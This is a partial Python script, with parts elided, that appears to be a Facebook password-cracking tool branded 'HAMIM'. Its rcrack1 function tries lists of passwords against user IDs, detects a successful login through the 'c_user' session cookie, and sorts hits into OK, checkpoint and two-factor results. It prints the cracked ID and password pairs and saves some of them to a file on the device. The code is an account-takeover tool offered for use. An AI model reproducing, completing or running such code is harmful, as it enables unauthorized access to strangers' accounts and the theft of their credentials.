...
sleep(1)
###os.system('xdg-open https://www.facebook.com/HAMIM.islam65653?mibextid=ZbWKwL')
logo = ("""
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r [\033[38;5;46mHAMIM\033[1;97m] [\033[38;5;45m%s\033[0m/%s] [OK\033[1;97m:-\033[38;5;46m%s\033[1;97m] [CP\033[1;97m:-\033[38;5;196m%s\033[1;97m] [2F\033[1;97m:-\033[38;5;45m%s\033[1;97m] \r'%(loop,tl,len(ok),len(cp),len(twf))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #os.system("play-audio HAMIM_OK.mp3")
                print(f'\33[1;92m[HAMIM-OK] '+uid+' | '+ps+'\33[0;92m')
               ## print(f" Cookie : {coki}")
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio HAMIM_2F.mp3")
                    print('\r\x1b[38;5;45m[HAMIM-2F] '+uid+' | '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/HAMIM-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                  #  os.system("play-audio HAMIM_CP.mp3")
                    print(f'\r\x1b[38;5;191m[HAMIM-CP] '+uid+' | '+ps+' '+Jawnx(uid)+' ')
